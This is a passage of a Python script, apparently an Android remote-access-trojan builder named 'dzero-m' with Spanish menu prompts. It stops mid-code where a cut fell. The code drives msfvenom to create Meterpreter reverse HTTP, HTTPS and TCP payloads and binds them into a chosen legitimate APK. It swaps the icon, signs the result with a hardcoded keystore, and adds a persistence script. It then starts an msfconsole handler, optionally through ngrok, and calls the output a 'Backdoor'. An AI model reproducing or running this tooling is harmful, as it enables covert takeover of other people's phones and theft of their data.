						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST: 
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()						
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	


			elif pay == '02':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new dzero-m method'.format(WHITE, YELLOW))

					m = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':					
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()							
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				
					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):							
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '03':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "dzero-m - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/dzero-m.apk')
						location = os.getcwd()
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
